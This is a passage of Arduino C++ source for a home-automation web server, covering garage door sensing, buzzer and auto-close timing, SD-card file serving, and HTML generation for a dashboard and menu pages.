  G_GarageBuzzerTimer     = 0;
  G_GarageBuzzerOneSecond = 0;
  G_GarageBuzzerOn        = false;
  digitalWrite(DC_GarageBuzzerPin, LOW);
  CheckRAM();
  Pop(c_proc_num);
} //SwitchGarageBuzzerOff
#endif

//----------------------------------------------------------------------------------------

#ifdef D_2WGApp
void GarageDoorProcess() {
  const byte c_proc_num = 16;
  Push(c_proc_num);

  //ACTION ANY CHANGE IN THE OPEN SENSOR
  //Normally LOW when garage is closed
  if (G_GarageOpenPinPrev != digitalRead(DC_GarageOpenPin)) {
    //This delay avoids the processing of momentary faults
    //You can test it with a quick hit of the switch - no system action occurs
    delay(100); //wait 1/10th sec and check again
    if (G_GarageOpenPinPrev != digitalRead(DC_GarageOpenPin)) {
      if (G_GarageOpenPinPrev == HIGH) {
        //From low to high - garage changing from open to close
        SwitchGarageBuzzerOn();
        ActivityWrite(EPSR(E_Garage_Closing_59));
        //If alarm active send email about any garage activity.
        //When the garage closes as part of turning the alarm on we set
        //G_PremisesAlarmTimer to suppress the premises alarm check error message.
        PremisesAlarmCheck(EPSR(E_Garage_Closing_59));
        //Switch the value and force the return of a momentary fault to be recorded
        G_GarageOpenPinPrev = LOW;
      }
      else { //prev LOW, now HIGH
        //From high to low - garage now fully open
        SwitchGarageBuzzerOff();
        ActivityWrite(EPSR(E_Garage_Open_60));
        //Switch the value and force the return of a momentary fault to be recorded
        G_GarageOpenPinPrev = HIGH;
      }
    } // 1/10th sec delay check
  }
  CheckRAM();

  //ACTION ANY CHANGE IN THE CLOSED SENSOR
  //Normally HIGH when garage is closed
  if (G_GarageClosedPinPrev != digitalRead(DC_GarageClosedPin)) {
    //This delay avoids the processing of momentary faults
    //You can test it with a quick hit of the switch - no system action occurs
    delay(100); //wait 1/10th sec and check again
    if (G_GarageClosedPinPrev != digitalRead(DC_GarageClosedPin)) {
      if (G_GarageClosedPinPrev == HIGH) {
        //From low to high - garage closed to open
        digitalWrite(DC_GarageOpenLedPin, HIGH); //Door Open
        G_GarageDoorOpenTimer = millis();
        G_GarageDoorOpenTimerTimout = C_FourMinutes;
        SwitchGarageBuzzerOn();
        ActivityWrite(EPSR(E_Garage_Opening_61));
        PremisesAlarmCheck(EPSR(E_Garage_Opening_61)); //If alarm active send email about any garage activity
        //Switch the value and force the return of a momentary fault to be recorded
        G_GarageClosedPinPrev = LOW;
      }
      else { //prev LOW, now HIGH
        //From high to low - garage now fully closed
        digitalWrite(DC_GarageOpenLedPin, LOW);   //Door Closed
        SwitchGarageBuzzerOff();
        G_GarageDoorOpenTimer = 0; //Force timer reset
        ActivityWrite(EPSR(E_Garage_Closed_62));
        //Switch the value and force the return of a momentary fault to be recorded
        G_GarageClosedPinPrev = HIGH;
      }
    } // 1/10th sec delay check
  }

  //SOUND THE BUZZER EVERY ONE SECOND AS REQURIED
  if (CheckSecondsDelay(G_GarageBuzzerTimer, C_OneSecond * 20))
    SwitchGarageBuzzerOff(); //Turn off after 20 secs
  else {
    if (CheckSecondsDelay(G_GarageBuzzerOneSecond, C_OneSecond)) {
      if (G_GarageBuzzerOn)
        digitalWrite(DC_GarageBuzzerPin, LOW);
      else
        digitalWrite(DC_GarageBuzzerPin, HIGH);
      //
      G_GarageBuzzerOneSecond = millis();
      G_GarageBuzzerOn = !G_GarageBuzzerOn;
    }
  }
  CheckRAM();

  //FLASH THE LED IF THE GARAGE IS INACTIVE AND DOOR IS CLOSED
  if ((!G_GarageDoorActive) && (digitalRead(DC_GarageClosedPin) == HIGH)) {
    if (CheckSecondsDelay(G_GarageDoorLEDFlashTimer, C_OneSecond)) {
      if (digitalRead(DC_GarageOpenLedPin) == HIGH) digitalWrite(DC_GarageOpenLedPin, LOW);
      else                                          digitalWrite(DC_GarageOpenLedPin, HIGH);
      G_GarageDoorLEDFlashTimer = millis();
    }
  }
  else if (digitalRead(DC_GarageClosedPin) == HIGH) //ACTIVE AND CLOSED - NO LED
    digitalWrite(DC_GarageOpenLedPin, LOW);
  //

  //Activate the buzzer 15 secs before an autoclose
  unsigned long l_buzzer_time = G_GarageDoorOpenTimer;
  if ((G_GarageDoorActive) &&                                                //Auto close buzzer only used if garage is active
      (G_GarageDoorOpenTimer != 0) &&                                        //Door opened start time
      (G_GarageBuzzerTimer == 0)   &&                                        //Buzzer not already running
      //(CheckSecondsDelay(&l_buzzer_time, G_GarageDoorOpenTimerTimout - 15000) == true) &&  //Auto Close time less 15 secs
      (CheckSecondsDelay(l_buzzer_time, G_GarageDoorOpenTimerTimout - 15000) == true) &&  //Auto Close time less 15 secs
      (digitalRead(DC_GarageClosedPin) == LOW)) {                             //Door still not closed
    ActivityWrite(EPSR(E_Auto_Garage_Close_Buzzer_63));
    SwitchGarageBuzzerOn();
  }

  //CLOSE THE DOOR AFTER FOUR MINUTES IF WE ARE IN ACTIVE MODE
  //OTHERWISE SEND AN EMAIL
  if ((G_GarageDoorOpenTimer != 0) &&                                        //Door opened start time
      (CheckSecondsDelay(G_GarageDoorOpenTimer, G_GarageDoorOpenTimerTimout) == true) &&  //Four Minute Timer
      (digitalRead(DC_GarageClosedPin) == LOW)) {                             //Door still not closed
    //OpenTimer has been reset to zero
    if (!G_GarageDoorActive) {
      //The email heading is automatically written to the activity log
      //The success or failure or the email is automatically written to the activity log
      EmailInitialise(EPSR(E_GARAGE_DOOR_OPEN_66));
      EmailLine(EPSR(E_Garage_Door_Not_ActivetbGarage_Door_is_Open_130));
      EmailDisconnect();
      //Reset the timer
      G_GarageDoorOpenTimer = millis();
      G_GarageDoorOpenTimerTimout = G_GarageDoorOpenTimerTimout * 2;
    }//The email will be sent at 4, 8, 16, 32 minues etc
    else {
      GarageDoorOperate(false);  //Close the door - will do nothing if garage door is not active
    } //
  }

  CheckRAM();
  //IF DOOR IS INACTIVE DO NOT DO SENSOR CHECKING
  if (!G_GarageDoorActive) {
    Pop(c_proc_num);
    return;
  }

  //Now check for Opened/Closed relay failure
  //OPEN SENSOR   CLOSE SENSOR   SITUATION
  //    LOW          HIGH        Door is Closed
  //   HIGH           LOW        Door is Open
  //    LOW           LOW        Door is Partially Open (Currently opening or closing) or broken sensor
  //   HIGH          HIGH        Faulty Sensor - door cannot be pushing against both sensors - one sensor is jammed

  //RESISTOR USAGE FOR NORMALLY CLOSED GARAGE DOOR
  //Open   Sensor - normally LOW  = pull down
  //Closed Sensor - normally HIGH - pull up

  //All OK if sensors are OPEN and CLOSED - either way
  if (digitalRead(DC_GarageOpenPin) != digitalRead(DC_GarageClosedPin)) {
    Pop(c_proc_num);
    return;
  }

  //Faulty Sensor - door cannot be pushing against both sensors - one sensor is jammed
  if ((digitalRead(DC_GarageOpenPin) == HIGH) &&
      (digitalRead(DC_GarageClosedPin) == HIGH)) {
    ActivityWrite(Message(M_Garage_Door_OPEN_AND_CLOSED_Fault_14));
    G_GarageDoorActive = false;
  }

  CheckRAM();
  Pop(c_proc_num);
} //GarageDoorProcess

//----------------------------------------------------------------------------------------

void GarageDoorOperate(boolean p_force_operate) {
  const byte c_proc_num = 17;
  Push(c_proc_num);
  if ((!G_GarageDoorActive) && (!p_force_operate)) {
    Pop(c_proc_num);
    return; //do nothing
  }
  //Door is in active mode OR we are force opening with GarageOpen UTL

  StatisticCount(St_Garage_Door_Operations, false); //don't exclude CWZ
  ActivityWrite(EPSR(E_Garage_Door_Operated_43));
  //The garage door takes 15 seconds to open or close
  //Switching the GarageDoorPin for 1/10 second will
  //"flash/short circuit" the garage door activation circuit
  //and open or close the garage door
  digitalWrite(DC_GarageDoorPin, LOW);
  delay(C_OneSecond / 10); //forced delay is necessary
  digitalWrite(DC_GarageDoorPin, HIGH);
  G_GarageDoorOpenTimer = 0; //default value
  CheckRAM();
  Pop(c_proc_num);
}  //GarageDoorOperate
#endif

//----------------------------------------------------------------------------------------
//BATHROOM FUNCTIONALITY
//----------------------------------------------------------------------------------------

#ifdef D_2WGApp
void BathroomProcess() {
  const byte c_proc_num = 18;
  Push(c_proc_num);
  //Placeholder
  //- Turn liht on and off with PIR detection and nighttime
  //- Turn fan on/off according to humidity level
  //- Turn heater off when cold and someone in the room
  //- Do not turn heater on if the fan is on
  CheckRAM();
  Pop(c_proc_num);
} //BathroomProcess
#endif

//----------------------------------------------------------------------------------------
//WEB PAGE FUNCTIONALITY
//----------------------------------------------------------------------------------------

void DumpFileToBrowser(const String &p_filename) {
  //dump ROBOTS.TXT, JPG, PNG, INO, CPP, H, XLS, PDF, DOC, ZIP files to browser
  const byte c_proc_num = 19;
  Push(c_proc_num);

  SPIDeviceSelect(DC_SDCardSSPin);
  String l_filename = p_filename; //We cannot use a const
  if (!SD.exists(&l_filename[0])) {
    StatisticCount(St_Direct_File_Hacks, true); //Exclude CWZ
    SPIDeviceSelect(DC_EthernetSSPin); //Enable Ethernet on SPI (Disable others)

    SendHTMLResponse(EPSR(E_404_Not_Found_270), "", true); //response, content_type, blank line terminate
    G_EthernetClient.println(F("<!DOCTYPE HTML>"));
    G_EthernetClient.println(F("<html><body>"));
    G_EthernetClient.println(F("<b>File Not Found</b> "));
    G_EthernetClient.println(p_filename);
    G_EthernetClient.println(F("</body></html>"));
    Pop(c_proc_num);
    return;
  }
  SPIDeviceSelect(DC_EthernetSSPin); //Enable Ethernet on SPI (Disable others)

  String l_content_type = EPSR(E_ContenthyTypeco__271);
  if (l_filename.indexOf(".TXT") != -1) {
    StatisticCount(St_Other_File_Downloads_E, true); //Exclude CWZ
    l_content_type += EPSR(E_textslplain_272);
  }
  else if (l_filename.indexOf(".JPG") != -1) {
    StatisticCount(St_Other_File_Downloads_E, true); //Exclude CWZ
    l_content_type += EPSR(E_imagesljpeg_273);
  }
  else if (l_filename.indexOf(".PNG") != -1) {
    if (l_filename.indexOf(".ICON") == -1) { //Don't count ICON requests
      StatisticCount(St_Other_File_Downloads_E, true); //Exclude CWZ
    }
    l_content_type += EPSR(E_imageslpng_274);
  }
  else if (l_filename.indexOf(".INO") != -1) {
    StatisticCount(St_Code_File_Downloads_E, true); //Exclude CWZ
    l_content_type += EPSR(E_textslplain_272);
  }
  else if (l_filename.indexOf(".CPP") != -1) {
    StatisticCount(St_Code_File_Downloads_E, true); //Exclude CWZ
    l_content_type += EPSR(E_textslplain_272);
  }
  else if (l_filename.indexOf(".H") != -1) {
    StatisticCount(St_Code_File_Downloads_E, true); //Exclude CWZ
    l_content_type += EPSR(E_textslplain_272);
  }
  else if (l_filename.indexOf(".PDF") != -1) {
    StatisticCount(St_Other_File_Downloads_E, true); //Exclude CWZ
    l_content_type += EPSR(E_applicationslpdf_275);
  }
  else if (l_filename.indexOf(".XLS") != -1) {
    StatisticCount(St_Other_File_Downloads_E, true); //Exclude CWZ
    l_content_type += EPSR(E_applicationslvnddtmshyexcel_276);
  }
  else if (l_filename.indexOf(".DOC") != -1) {
    StatisticCount(St_Other_File_Downloads_E, true); //Exclude CWZ
    l_content_type += EPSR(E_applicationslmsword_277);
  }
  else if (l_filename.indexOf(".ZIP") != -1) {
    StatisticCount(St_Other_File_Downloads_E, true); //Exclude CWZ
    l_content_type += EPSR(E_applicationslzip_329);
  }
  else {//D
    StatisticCount(St_Other_File_Downloads_E, true); //Exclude CWZ
    l_content_type += EPSR(E_textslplain_272);
  }
  //Don't blank line terminate because we need to add Content-Length: XXXX
  SendHTMLResponse(EPSR(E_200_OK_278), l_content_type, false); //response, content_type, blank line terminate

  //Open the SD card file
  SPIDeviceSelect(DC_SDCardSSPin);
  File l_file = SD.open(&l_filename[0], FILE_READ);
  SPIDeviceSelect(DC_EthernetSSPin); //Enable Ethernet on SPI (Disable others)

  if (l_filename.indexOf(".TXT") == -1) {
    //For images etc we write content length to the ethernet socket
    SPIDeviceSelect(DC_SDCardSSPin);
    unsigned long l_filesize = l_file.size();
    SPIDeviceSelect(DC_EthernetSSPin); //Enable Ethernet on SPI (Disable others)
    int l_posn = l_filename.lastIndexOf("/");
    String l_fname = p_filename;
    if (l_posn != -1)
      l_fname = p_filename.substring(l_posn + 1);
    //
    G_EthernetClient.print(F("Content-Disposition: attachment; filename=\""));
    G_EthernetClient.print(l_fname);
    G_EthernetClient.println("\"");
    G_EthernetClient.print(F("Content-Length: "));
    G_EthernetClient.println(l_filesize);
  }

  G_EthernetClient.println(); //DO NOT REMOVE OR WEB PAGES WILL NOT DISPLAY - HEADERS MUST END WITH A BLANK LINE

  //Now dump the file to the ethernetclient in buffered blocks
  //Consider bigger buffer size to see if we can get faster performance
  //Beware of running out of RAM
  const byte c_file_buffer_size = 128;
  byte l_buffer[c_file_buffer_size];
  int l_count = 0;
  int l_mod = 0;
  SPIDeviceSelect(DC_SDCardSSPin);
  while (l_file.available()) {
    l_count = l_file.read(l_buffer, c_file_buffer_size);
    if (l_count == 0)
      break;
    //
    SPIDeviceSelect(DC_EthernetSSPin); //Enable Ethernet on SPI (Disable others)
    G_EthernetClient.write(l_buffer, l_count);
    l_mod++;
    if ((l_mod % 4) == 0) { //Only check every 512 chars (4 buffers)
      //This next line is used to terminate long www file download operations
      //when there is a local html file request waiting
      if (Check4WaitingLocalHTMLReq()) {
        G_EthernetClient.println();
        G_EthernetClient.println(EPSR(E_HTML_Process_Termination_316));
        break;
      }
    }
    SPIDeviceSelect(DC_SDCardSSPin);
  }
  SPIDeviceSelect(DC_EthernetSSPin); //Enable Ethernet on SPI (Disable others)

  SPIDeviceSelect(DC_SDCardSSPin); //Enable Ethernet on SPI (Disable others)
  l_file.close();
  SPIDeviceSelect(DC_EthernetSSPin); //Enable Ethernet on SPI (Disable others)

  CheckRAM();
  Pop(c_proc_num);
} //

//----------------------------------------------------------------------------------------

void InitialiseWebPage(const String &p_title) {
  InitialiseWebPage2(EPSR(E_200_OK_278), p_title);
}

//----------------------------------------------------------------------------------------

void InitialiseWebPage2(const String &p_response, const String &p_title) {
  //This procedure contains all the initialisation for almost every application web page.
  //See the SD card files /PUBLIC/INITWBPG.TXT and /PUBLIC/ACTNMENU.TXT
  //for the program code for these two common procedures.
  const byte c_proc_num = 20;
  Push(c_proc_num);

  SendHTMLResponse(p_response, "", true); //response, content_type, blank line terminate
  G_EthernetClient.println(F("<!DOCTYPE HTML>"));
  G_EthernetClient.println(F("<html><head>"));
  G_EthernetClient.println(F("<style type=\"text/css\">"));
  G_EthernetClient.println(F(  "head {font-family:Arial;text-align:left}"));
  G_EthernetClient.println(F("h2{color:blue;line-height:0px}"));
  G_EthernetClient.println(F("h5{color:blue;line-height:0px}"));
  G_EthernetClient.println(F("body {font-family:Arial;text-align:left;font-size:30px}"));
  G_EthernetClient.println(F("table {text-align:center;font-size:20px;background-color:DarkSeaGreen}"));
  G_EthernetClient.println(F("</style>"));

  //This line scales the page according to the device
  G_EthernetClient.println(F("<meta name='viewport' content='width=device-width, initial-scale=1.0'>"));

  if (p_title == EPSR(E_SD_CARD_78)) {
    //When a used clicks on a file within the SD Card List (browser)
    //form this javascript is invoked to assign the selected filename
    //for the filename input field. That field (fieldname) gets put
    //into the form data associated with the form's POST html request.
    //The system extracts the filename before performing the
    //file display or delete operation on the file.
    G_EthernetClient.println(F("<script type=\"text/javascript\">"));
    G_EthernetClient.println(F("function fnamesubmit(p_filename) {"));
    G_EthernetClient.println(F("var fnlabel = document.getElementById('FILENAME');"));
    G_EthernetClient.println(F("fnlabel.value = p_filename;"));
    G_EthernetClient.println(F("var form = document.getElementById('CWZHAS');"));
    G_EthernetClient.println(F("form.submit();"));
    G_EthernetClient.println(F("}"));
    G_EthernetClient.println(F("</script>"));
  }

  String l_title = p_title;
  if (p_title.indexOf(EPSR(E_INPUT_83)) != -1)
    l_title = EPSR(E_INPUT_83);
  //
  G_EthernetClient.print(F("<title>"));
  G_EthernetClient.print(String(G_Website + " " + l_title));
  G_EthernetClient.print(F("</title>"));
  G_EthernetClient.println(F("</head>"));

  if (HTMLParmRead(E_HEAD_315) == "T") {
    //Only the page head is required so finish up now.
    G_EthernetClient.println(F("</html>"));
    CheckRAM();
    Pop(c_proc_num);
    return;
  }

  G_EthernetClient.println(F("<body>"));

  String l_hx;
  String l_hx2;
  if (!G_Mobile_Flag) {
    l_hx  = "<h2>";
    l_hx2 = "</h2>";
  }
  else {
    l_hx  = "<h5>";
    l_hx2 = "</h5>";
  }

  G_EthernetClient.print(l_hx);
  String l_page_title;
#ifdef D_2WGApp
  l_page_title = String(G_Website + EPSR(E__HOME_AUTOMATION_279));
#else
  l_page_title = String(G_Website + EPSR(E__MONITOR_280));
#endif
  l_page_title.replace(" ", "&nbsp;");
  G_EthernetClient.print(l_page_title);

  G_EthernetClient.println(l_hx2);

  G_EthernetClient.print(F("<form id='CWZHAS' method='POST'"));
  if (p_title.indexOf(EPSR(E_INPUT_83)) != -1) {
    G_EthernetClient.print(F(" action=/"));
    G_EthernetClient.print(G_PageNames[17]); //Return from password input (which returns to /2WG/ dashboard)
    G_EthernetClient.println(F("/"));
  }
  else if (p_title.indexOf(EPSR(E_UPLOAD_281)) != -1) {
    //File upload form - you have to be logged in
    G_EthernetClient.print(F(" enctype='multipart/form-data' action=/"));
    G_EthernetClient.print(G_PageNames[44]); //File Upload
    G_EthernetClient.println(F("/"));
  }
  G_EthernetClient.print(F(">"));

  G_EthernetClient.println(F("<table id='FORMTable' border=0>"));
  if (GetUPSBatteryVoltage() < 1) {
    G_EthernetClient.println(F("<tr style=background-color:Pink;>"));
    G_EthernetClient.println(F("<td colspan='0' style='font-size:32px;text-align:centre;'>"));
    G_EthernetClient.println(F("<b>MAINTENANCE MODE</b><br>"));
    G_EthernetClient.println(F("<b>Interruptions may occur.<b>"));
    G_EthernetClient.println(F("</td></tr>"));
  }

  G_EthernetClient.println(F(  "<tr>")); //First row the form rables

  CheckRAM();
  Pop(c_proc_num);
} //InitialiseWebPage

//---------------------------------------------------------------------------------------------

void InsertActionMenu(int p_skip_menu, const String &p_title, const byte p_page_hit_num) {
  //This procedure inserts the left hand side action menu on every application web page.
  const byte c_proc_num = 21;
  Push(c_proc_num);

  G_EthernetClient.println(F(    "<td style=\"vertical-align:top;\">"));
  G_EthernetClient.println(F(      "<table id='LHSTable' border=1>"));

  if (G_CWZ_HTML_Req_Flag)
    G_EthernetClient.println(F("<tr style=\"background-color:cyan;\">"));
  else
    G_EthernetClient.println(F("<tr style=\"background-color:sandybrown;\">"));
  //
  G_EthernetClient.print(F("<td><b>"));
  String l_title = p_title;
  l_title.toUpperCase();
  G_EthernetClient.print(l_title);
  G_EthernetClient.print(F("</b></td>"));
  G_EthernetClient.println(F("</tr>"));
  //G_EthernetClient.print(F("<tr><td><IMG SRC=\"/IMAGES/HOME.JPG/\" ALT=\"HOME\"></td></tr>"));

  G_EthernetClient.print(F(          "<tr><td>Time: "));
  G_EthernetClient.print(                 TimeToHHMMSS(Now()));
  G_EthernetClient.println(F(          "</td></tr>"));

  if ((!G_Mobile_Flag) && (p_skip_menu == 0)) {
    G_EthernetClient.print(F(          "<tr><td>Climate: "));
    //We don't extract new DHT readings until at least two seconds after any previous readings
    while (CheckSecondsDelay(G_DHTDelayTimer, C_OneSecond * 2) == false) {
    }//Do Nothing
    G_DHTDelayTimer = millis();
    byte l_sensor = 0; //outdoor
    int l_temp, l_hum;
    if (DHTRead(l_sensor, l_temp, l_hum) == DHTLIB_OK) {
      G_EthernetClient.print(TemperatureToString(C_SensorDHT11[l_sensor], l_temp, true));
      G_EthernetClient.print(F("&deg;C "));
      G_EthernetClient.print(HumidityToString(l_sensor, l_hum));
      G_EthernetClient.print('%');
    }
    else
      G_EthernetClient.print(F(            "Unknown"));
    //
    G_EthernetClient.println(F(        "</td></tr>"));
  }

#ifdef D_2WGApp
  if ((!G_Mobile_Flag) && (p_skip_menu == 0)) {
    G_EthernetClient.print(F(          "<tr><td>Light Level: "));
    G_EthernetClient.print(analogRead(GC_LightPin));
    if (G_LEDNightLightTimer)
      G_EthernetClient.print(F("/ON"));
    else
      G_EthernetClient.print(F("/OFF"));
    //
    G_EthernetClient.println(F(        "</td></tr>"));
  }
#endif

  if (p_page_hit_num < DC_StatisticsCount) {
    StatisticCount(p_page_hit_num, true); //Exclude CWZ
  }
  if (!G_Mobile_Flag) {
    G_EthernetClient.print(F("<tr><td>Month Page Hits: "));
    if (p_page_hit_num < DC_StatisticsCount) {
      G_EthernetClient.print(FormatAmt(G_StatActvMth[p_page_hit_num], 0));
    }
    else
      G_EthernetClient.print(F("<br>**Page Hit Range Error**"));
    //
    G_EthernetClient.println(F(          "</td></tr>"));

    G_EthernetClient.println(F(        "<tr style=\"background-color:Khaki;\">"));
    G_EthernetClient.println(F(            "<td><b>WEB PAGE MENU</b></td>"));
    G_EthernetClient.println(F(        "</tr>"));
  }

  G_EthernetClient.println(F(          "<tr><td>"));
  if (p_skip_menu != 0) {
    G_EthernetClient.print(F("<a href=/"));
    G_EthernetClient.print(G_Website);
    G_EthernetClient.println(F("/>Dashboard</a><br>"));
  }
  if (p_skip_menu != 100) {
    if (G_Mobile_Flag)
      G_EthernetClient.println(F("<br>"));
    //
    G_EthernetClient.print(F("<a href=/"));
    G_EthernetClient.print(G_PageNames[1]);
    G_EthernetClient.println(F("/>Recent Climate</a><br>"));
  }
  if (p_skip_menu != 200) {
    if (G_Mobile_Flag)
      G_EthernetClient.println(F("<br>"));
    //
    G_EthernetClient.print(F("<a href=/"));
    G_EthernetClient.print(G_PageNames[2]);
    G_EthernetClient.println(F("/>Climate for Week</a><br>"));
  }
#ifdef D_2WGApp
  if (p_skip_menu != 900) {
    if (G_Mobile_Flag)
      G_EthernetClient.println(F("<br>"));
    //
    G_EthernetClient.print(F("<a href=/"));
    G_EthernetClient.print(G_PageNames[36]);
    G_EthernetClient.println(F("/>Home Heating</a><br>"));
  }
  if (p_skip_menu != 300) {
    if (G_Mobile_Flag)
      G_EthernetClient.println(F("<br>"));
    //
    G_EthernetClient.print(F("<a href=/"));
    G_EthernetClient.print(G_PageNames[3]);
    G_EthernetClient.println(F("/>Bathroom</a><br>"));
  }
#endif
  if (p_skip_menu != 400) {
    if (G_Mobile_Flag)
      G_EthernetClient.println(F("<br>"));
    //
    G_EthernetClient.print(F("<a href=/"));
    G_EthernetClient.print(G_PageNames[4]);
    G_EthernetClient.println(F("/>Security</a><br>"));
  }
  if (G_Mobile_Flag)
    G_EthernetClient.println(F("<br>"));
  //
  G_EthernetClient.print(F("<a href=/"));
  G_EthernetClient.print(G_PageNames[5]);
  G_EthernetClient.println(F("/>SD Card</a><br>"));
  if (p_skip_menu != 700) {
    if (G_Mobile_Flag)
      G_EthernetClient.println(F("<br>"));
    //
    G_EthernetClient.print(F("<a href=/"));
    G_EthernetClient.print(G_PageNames[19]);
    G_EthernetClient.println(F("/>Settings</a><br>"));
  }
  if (p_skip_menu != 750) {
    if (G_Mobile_Flag)
      G_EthernetClient.println(F("<br>"));
    //
    G_EthernetClient.print(F("<a href=/"));
    G_EthernetClient.print(G_PageNames[42]);
    G_EthernetClient.println(F("/>Ethernet Sockets</a><br>"));
  }
  if (p_skip_menu != 975) {
    if (G_Mobile_Flag)
      G_EthernetClient.println(F("<br>"));
    //
    G_EthernetClient.print(F("<a href=/"));
    G_EthernetClient.print(G_PageNames[48]);
    G_EthernetClient.println(F("/>Crawler Activity</a><br>"));
  }
  if (p_skip_menu != 775) {
    if (G_Mobile_Flag)
      G_EthernetClient.println(F("<br>"));
    //
    G_EthernetClient.print(F("<a href=/"));
    G_EthernetClient.print(G_PageNames[45]);
    G_EthernetClient.println(F("/>Hacker Activity</a><br>"));

  }
  if (p_skip_menu != 800) {
    if (G_Mobile_Flag)
      G_EthernetClient.println(F("<br>"));
    //
    G_EthernetClient.print(F("<a href=/"));
    G_EthernetClient.print(G_PageNames[24]);
    G_EthernetClient.println(F("/>SRAM Usage</a><br>"));
  }
  if (p_skip_menu != 950) {
    if (G_Mobile_Flag)
      G_EthernetClient.println(F("<br>"));
    //
    G_EthernetClient.print(F("<a href=/"));
    G_EthernetClient.print(G_PageNames[47]);
    G_EthernetClient.println(F("/>Statistics</a><br>"));
  }

  if (p_skip_menu != 999) {
    if ((UserLoggedIn()) ||
        (LocalIP(G_RemoteIPAddress))) {
      if (G_Mobile_Flag)
        G_EthernetClient.println(F("<br>"));
      //
      G_EthernetClient.print(F("<a href=/"));
      G_EthernetClient.print(G_PageNames[49]);
      G_EthernetClient.println(F("/>Error Page</a><br>"));
    }
  }
  G_EthernetClient.println(F("</td></tr>"));

  CheckRAM();
  Pop(c_proc_num);
} //InsertActionMenu

//---------------------------------------------------------------------------------------------

void ShowStatisticsComment(const byte p_cols) {
  const byte c_proc_num = 114;
  Push(c_proc_num);
  G_EthernetClient.print(F("<tr><td "));
  if (p_cols != 1) {
    G_EthernetClient.print(F("colspan=\""));
    G_EthernetClient.print(p_cols);
    G_EthernetClient.print(F("\""));
  }
  G_EthernetClient.println(F("style=\"vertical-align:top;\">"));
  G_EthernetClient.println(F("<table border=1>"));
  G_EthernetClient.print  (F("<tr style=\"font-family:Courier;background-color:White;\">"));
  G_EthernetClient.println(F("<td align=\"left\">"));
  G_EthernetClient.print  (F("Statistics showing <br>"));
  G_EthernetClient.print  (F("on this web page <br>"));
  G_EthernetClient.print  (F("represent counts <br>"));
  G_EthernetClient.print  (F("for the current <br>"));
  G_EthernetClient.print  (F("month and day."));
  G_EthernetClient.print(F("</td>"));
  G_EthernetClient.print(F("</tr>"));
  G_EthernetClient.println(F("</table>"));
  G_EthernetClient.print(F("</td></tr>"));
  CheckRAM();
  Pop(c_proc_num);
}  //ShowStatisticsComment

//---------------------------------------------------------------------------------------------

void DashboardWebPage() {
  const byte c_proc_num = 22;
  Push(c_proc_num);

  //See the SD card files /PUBLIC/INITWBPG.TXT and /PUBLIC/ACTNMENU.TXT
  //for the program code for these two common procedures.
  InitialiseWebPage(EPSR(E_DASHBOARD_69));
  if (HTMLParmRead(E_HEAD_315) == "T") {
    CheckRAM();
    Pop(c_proc_num);
    return;
  }
  InsertActionMenu(0, EPSR(E_DASHBOARD_69), St_Dashboard_WPE);

  G_EthernetClient.println(F(        "<tr style=\"background-color:Khaki;\">"));
  G_EthernetClient.println(F(            "<td><b>PAGE ACTIONS</b></td>"));
  G_EthernetClient.println(F(        "</tr>"));

  G_EthernetClient.print(F(          "<tr><td>"));

  InsertLogFileLinks(0); //Hack (public) or all five links

  if (!UserLoggedIn()) {
    G_EthernetClient.print(F(             "<a href=/"));
    G_EthernetClient.print(G_PageNames[16]);
    G_EthernetClient.print(F(             "/>Login</a>"));
  }
  G_EthernetClient.println(F(        "</td></tr>"));

  //END OF MASTER TABLE, ROW 1, CELL 1 on LHS
  //Time, Page Hits, Page Menu, Action Menu all on LHS
  G_EthernetClient.print(F(        "</table>"));
  G_EthernetClient.print(F(      "</td>"));

  //START OF RHS PAGE DATA
  //A NEW CELL ON ROW 1 OF THE MASTER TABLE
  G_EthernetClient.println(F(    "<td style=\"vertical-align:top;\">"));
  G_EthernetClient.println(F(      "<table border=1>"));
  G_EthernetClient.println(F(        "<tr style=\"background-color:Khaki;\">"));
  G_EthernetClient.println(F(          "<td><b>MEASURE</b></td>"));
  G_EthernetClient.println(F(          "<td><b>VALUE</b></td>"));
  G_EthernetClient.println(F(        "</tr>"));

  G_EthernetClient.println(F(        "<tr>"));
  G_EthernetClient.println(F(          "<td>Date and Time</td>"));
  G_EthernetClient.print(F(            "<td>"));
  G_EthernetClient.print(                 DayOfWeek(Now())); //MON, TUE, etc
  G_EthernetClient.print(                 " ");
  G_EthernetClient.print(                 DateToString(Now()));
  G_EthernetClient.print(                 "<br>");
  G_EthernetClient.print(                 TimeToHHMMSS(Now()));
  G_EthernetClient.print(F(            "</td>"));
  G_EthernetClient.print(F(          "</tr>"));

  G_EthernetClient.println(F(          "<tr><td>Build Date</td><td>"));
  G_EthernetClient.print(DateToString(DateExtract(C_BuildDate)));
  G_EthernetClient.print(F(            "</td></tr>"));

  long l_mn = millis() / 60000;
  long l_dy, l_hr;
  l_hr = l_mn / 60;
  l_mn = l_mn % 60;
  l_dy = l_hr / 24;
  l_hr = l_hr % 24;
  G_EthernetClient.println(F(          "<tr><td>Current Runtime</td><td>"));
  G_EthernetClient.print(                 l_dy);
  G_EthernetClient.print(                 F("D "));
  G_EthernetClient.print(                 l_hr);
  G_EthernetClient.print(                 F("H "));
  G_EthernetClient.print(                 l_mn);
  G_EthernetClient.print(                 F("M</td></tr>"));

  G_EthernetClient.print(F("<tr><td>Your IP Address<br></td><td>"));
  G_EthernetClient.print(G_EthernetClient.getRemoteIPString());
  G_EthernetClient.println(F("</td></tr>"));

  G_EthernetClient.print(F("<tr><td>UPS Battery<br></td><td>"));
  G_EthernetClient.print(FormatAmt(GetUPSBatteryVoltage(), 1));
  G_EthernetClient.print(F(" Volts"));
  G_EthernetClient.println(F("</td></tr>"));

  if (!G_Mobile_Flag) {
    G_EthernetClient.println(F(          "<tr><td>Next Climate Update</td><td>"));
    G_EthernetClient.print(                 TimeToHHMM(G_NextClimateUpdateTime));
    G_EthernetClient.print(F(            "</td></tr>"));

#ifdef D_2WGApp
    G_EthernetClient.print(F("<tr><td>Heat Resource</td><td>"));
    int l_heat_res;
    int l_hallway_temp;
    int l_outside_temp;
    int l_outside_hum;
    if (CalculateHeatResource(l_heat_res, l_hallway_temp, l_outside_temp, l_outside_hum)) {
      //We get back standardised values which are multiplied by 10 (temp also uplifted 35 degrees)
      //For the heat resource difference no 35 degree downshift reqd
      //But divide by ten is reqd
      if (l_heat_res >= 0)
        G_EthernetClient.print(FormatAmt(double(l_heat_res) / 10, 1));
      else {
        G_EthernetClient.print('(');
        G_EthernetClient.print(FormatAmt(double(-l_heat_res) / 10, 1));
        G_EthernetClient.print(')');
      }
      G_EthernetClient.print(F("&deg;C</td></tr>"));
    }
    else //temp read error
